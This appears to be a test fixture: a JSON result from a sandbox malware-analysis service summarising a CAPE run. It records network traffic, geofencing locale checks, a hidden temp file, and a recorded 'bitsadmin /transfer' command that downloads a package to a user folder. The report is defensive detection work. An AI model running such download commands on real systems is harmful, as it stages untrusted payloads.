@@ -1,0 +1,417 @@
+{
+    "result": {
+        "score": 190,
+        "sections": [
+            {
+                "body": null,
+                "classification": "TLP:C",
+                "body_format": "TEXT",
+                "body_config": {},
+                "depth": 0,
+                "heuristic": null,
+                "tags": {},
+                "title_text": "Parent",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "{\"CAPE Task ID\": 279602, \"Duration\": \"00h 02m 03s\\t(2025-11-21 15:39:20.000 to 2025-11-21 15:41:23.000)\", \"Routing\": \"inetsim\", \"CAPE Version\": \"2.4-CAPE\"}",
+                "classification": "TLP:C",
+                "body_format": "KEY_VALUE",
+                "body_config": {},
+                "depth": 1,
+                "heuristic": null,
+                "tags": {},
+                "title_text": "Analysis Information",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": null,
+                "classification": "TLP:C",
+                "body_format": "TEXT",
+                "body_config": {},
+                "depth": 1,
+                "heuristic": null,
+                "tags": {},
+                "title_text": "Network Activity",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[{\"timestamp\": 2.3953819274902344, \"protocol\": \"tcp\", \"src_ip\": \"169.254.128.139\", \"src_port\": 49750, \"domain\": null, \"dest_ip\": \"20.165.94.63\", \"dest_port\": 443, \"image\": null, \"pid\": null, \"guid\": null}]",
+                "classification": "TLP:C",
+                "body_format": "TABLE",
+                "body_config": {
+                    "column_order": [
+                        "timestamp",
+                        "protocol",
+                        "src_ip",
+                        "src_port",
+                        "domain",
+                        "dest_ip",
+                        "dest_port",
+                        "image",
+                        "pid",
+                        "guid"
+                    ]
+                },
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 1004,
+                    "score": 10,
+                    "name": "TCP/UDP Detected",
+                    "attack": [],
+                    "signature": []
+                },
+                "tags": {
+                    "network": {
+                        "protocol": [
+                            "tcp"
+                        ],
+                        "dynamic": {
+                            "ip": [
+                                "20.165.94.63"
+                            ]
+                        },
+                        "port": [
+                            443,
+                            49750
+                        ]
+                    }
+                },
+                "title_text": "TCP/UDP Network Traffic",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": null,
+                "classification": "TLP:C",
+                "body_format": "TEXT",
+                "body_config": {},
+                "depth": 3,
+                "heuristic": {
+                    "heur_id": 1010,
+                    "score": 10,
+                    "name": "TCP Detected",
+                    "attack": [],
+                    "signature": []
+                },
+                "tags": {},
+                "title_text": "TCP Network Traffic Detected",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": true,
+                "promote_to": null
+            },
+            {
+                "body": "[{\"timestamp\": 2.3953819274902344, \"protocol\": \"tcp\", \"src_ip\": \"169.254.128.139\", \"src_port\": 49750, \"domain\": null, \"dest_ip\": \"20.165.94.63\", \"dest_port\": 443, \"image\": null, \"pid\": null, \"guid\": null}]",
+                "classification": "TLP:C",
+                "body_format": "TABLE",
+                "body_config": {
+                    "column_order": [
+                        "timestamp",
+                        "protocol",
+                        "src_ip",
+                        "src_port",
+                        "domain",
+                        "dest_ip",
+                        "dest_port",
+                        "image",
+                        "pid",
+                        "guid"
+                    ]
+                },
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 1005,
+                    "score": 10,
+                    "name": "Non-HTTP Traffic over HTTP ports",
+                    "attack": [],
+                    "signature": []
+                },
+                "tags": {
+                    "network": {
+                        "dynamic": {
+                            "ip": [
+                                "20.165.94.63"
+                            ]
+                        },
+                        "port": [
+                            443
+                        ]
+                    }
+                },
+                "title_text": "Non-HTTP Traffic Over HTTP Ports",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": null,
+                "classification": "TLP:C",
+                "body_format": "TEXT",
+                "body_config": {},
+                "depth": 1,
+                "heuristic": null,
+                "tags": {},
+                "title_text": "Signatures",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Network activity detected but not expressed in monitor API logs\", {}], [\"KEY_VALUE\", {\"ip\": \"20.165.94.63\"}, {}], [\"KEY_VALUE\", {\"domain\": \"online_nat.online_nat\"}, {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 52,
+                    "score": 10,
+                    "name": "Stealth",
+                    "attack": [
+                        {
+                            "attack_id": "T1070",
+                            "pattern": "Indicator Removal",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        },
+                        {
+                            "attack_id": "T1036",
+                            "pattern": "Masquerading",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        },
+                        {
+                            "attack_id": "T1564.001",
+                            "pattern": "Hidden Files and Directories",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        }
+                    ],
+                    "signature": [
+                        {
+                            "name": "stealth_network",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {
+                    "network": {
+                        "dynamic": {
+                            "ip": [
+                                "20.165.94.63"
+                            ]
+                        }
+                    }
+                },
+                "title_text": "Signature: stealth_network",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Queries the computer locale (possible geofencing)\", {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 9999,
+                    "score": 10,
+                    "name": "Unknown",
+                    "attack": [],
+                    "signature": [
+                        {
+                            "name": "queries_locale_api",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {},
+                "title_text": "Signature: queries_locale_api",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Checks system language via registry key (possible geofencing)\", {}], [\"KEY_VALUE\", {\"regkey\": \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Nls\\\\CustomLocale\\\\en-US\"}, {}], [\"KEY_VALUE\", {\"regkey\": \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Nls\\\\ExtendedLocale\\\\en-US\"}, {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 9999,
+                    "score": 10,
+                    "name": "Unknown",
+                    "attack": [],
+                    "signature": [
+                        {
+                            "name": "language_check_registry",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {
+                    "dynamic": {
+                        "registry_key": [
+                            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Nls\\CustomLocale\\en-US",
+                            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Nls\\ExtendedLocale\\en-US"
+                        ]
+                    }
+                },
+                "title_text": "Signature: language_check_registry",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Uses Windows utilities for basic functionality\", {}], [\"KEY_VALUE\", {\"command\": \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe  /K \\\"C:\\\\Users\\\\buddy\\\\AppData\\\\Local\\\\Temp\\\\bits.bat\\\"\"}, {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 16,
+                    "score": 30,
+                    "name": "Command",
+                    "attack": [
+                        {
+                            "attack_id": "T1059",
+                            "pattern": "Command and Scripting Interpreter",
+                            "categories": [
+                                "execution"
+                            ]
+                        }
+                    ],
+                    "signature": [
+                        {
+                            "name": "uses_windows_utilities",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {
+                    "dynamic": {
+                        "process": {
+                            "command_line": [
+                                "C:\\WINDOWS\\system32\\cmd.exe  /K \"C:\\Users\\buddy\\AppData\\Local\\Temp\\bits.bat\""
+                            ]
+                        }
+                    }
+                },
+                "title_text": "Signature: uses_windows_utilities",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Creates a hidden or system file\", {}], [\"KEY_VALUE\", {\"file\": \"C:\\\\Users\\\\buddy\\\\BIT3E53.tmp\"}, {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 52,
+                    "score": 50,
+                    "name": "Stealth",
+                    "attack": [
+                        {
+                            "attack_id": "T1070",
+                            "pattern": "Indicator Removal",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        },
+                        {
+                            "attack_id": "T1036",
+                            "pattern": "Masquerading",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        },
+                        {
+                            "attack_id": "T1564.001",
+                            "pattern": "Hidden Files and Directories",
+                            "categories": [
+                                "defense-evasion"
+                            ]
+                        }
+                    ],
+                    "signature": [
+                        {
+                            "name": "stealth_file",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {
+                    "dynamic": {
+                        "process": {
+                            "file_name": [
+                                "C:\\Users\\buddy\\BIT3E53.tmp"
+                            ]
+                        }
+                    }
+                },
+                "title_text": "Signature: stealth_file",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            },
+            {
+                "body": "[[\"TEXT\", \"Uses suspicious command line tools or Windows utilities\", {}], [\"KEY_VALUE\", {\"command\": \"bitsadmin  /transfer myDownloadJob /download /priority normal http://www.example.com/package.zip C:\\\\\\\\Users\\\\\\\\buddy\\\\\\\\testfile2.txt\"}, {}]]",
+                "classification": "TLP:C",
+                "body_format": "MULTI",
+                "body_config": {},
+                "depth": 2,
+                "heuristic": {
+                    "heur_id": 16,
+                    "score": 50,
+                    "name": "Command",
+                    "attack": [
+                        {
+                            "attack_id": "T1059",
+                            "pattern": "Command and Scripting Interpreter",
+                            "categories": [
+                                "execution"
+                            ]
+                        }
+                    ],
+                    "signature": [
+                        {
+                            "name": "suspicious_command_tools",
+                            "frequency": 1,
+                            "safe": false
+                        }
+                    ]
+                },
+                "tags": {
+                    "dynamic": {
+                        "process": {
+                            "command_line": [
+                                "bitsadmin  /transfer myDownloadJob /download /priority normal http://www.example.com/package.zip C:\\\\Users\\\\buddy\\\\testfile2.txt"
+                            ]
+                        }
+                    }
+                },
+                "title_text": "Signature: suspicious_command_tools",
+                "zeroize_on_tag_safe": false,
+                "auto_collapse": false,
+                "promote_to": null
+            }
+        ]
+    }
+}
